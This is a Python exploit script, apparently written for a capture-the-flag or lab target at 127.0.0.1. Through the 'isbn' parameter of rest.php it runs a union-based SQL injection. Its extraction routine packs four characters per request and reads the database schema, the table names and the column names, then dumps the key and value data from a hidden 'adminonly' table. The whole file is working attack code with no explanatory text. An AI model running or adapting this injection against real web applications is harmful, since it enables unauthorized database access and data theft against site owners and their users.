import requests

URL = "127.0.0.1"



URL = "http://" + URL + "/rest.php"

i2b = lambda x: b'\x00' if x == 0 else bytes.fromhex("%x"%x)

def getColumnData(table, col, whr=""):
	def sendQuery(sel, frm, whr="", col="", offset=0):
		if len(col) == 0:
			qry = f"1'  UNION SELECT {sel} FROM {frm} "
			qry += "" if len(whr) == 0 else f"WHERE {whr} "
			qry += f"LIMIT 1 OFFSET {offset} "
			qry += " -- -"
		else:
			qry = f"1'  UNION SELECT {sel} FROM (SELECT {col} FROM {frm} "
			qry += "" if len(whr) == 0 else f"WHERE {whr} "
			qry += f"ORDER BY {col} LIMIT 1 OFFSET {offset}) AS {col} -- -"

		try:
			params = {"cmd": "requestbook", "isbn": qry}
			res = requests.get(URL, params = params)
			l = int(res.text.split("(")[1].split(")")[0])
		except:
			if "Sorry" in res.text:
				return 0

		return l

	rows = sendQuery("1000000000+COUNT(*)", table, whr) - 1000000000

	print(f"There're total {rows} entries.")
	for offset in range(rows):
		s = b''
		j = 1
		while True:
			q = f"(ascii(substr({col}, {j}, 1)) << 24) + (ascii(substr({col}, {j+1}, 1)) << 16) + (ascii(substr({col}, {j+2}, 1)) << 8) + (ascii(substr({col}, {j+3}, 1)))"
			r = sendQuery(q, table, whr, col, offset)
			if (r == 0):
				q = "1000000000+"+q
				r = sendQuery(q, table, whr, col, offset) - 1000000000
			s += i2b(r)

			if b"\x00" in s:
				s = s.strip(b"\x00")
				break
			j += 4
		print(offset + 1, s.decode())
	print("")

print("Retrieving schema...")
getColumnData("INFORMATION_SCHEMA.SCHEMATA", "schema_name")

print("Retrieving secret table...")
getColumnData("INFORMATION_SCHEMA.TABLES", "table_name", "TABLE_SCHEMA='books'")

print("Retrieving columns in secret table...")
getColumnData("INFORMATION_SCHEMA.COLUMNS", "column_name", "TABLE_NAME='adminonly'")

print("Retrieving key data in secret table...")
getColumnData("adminonly", "key")

print("Retrieving value data in secret table...")
getColumnData("adminonly", "value")
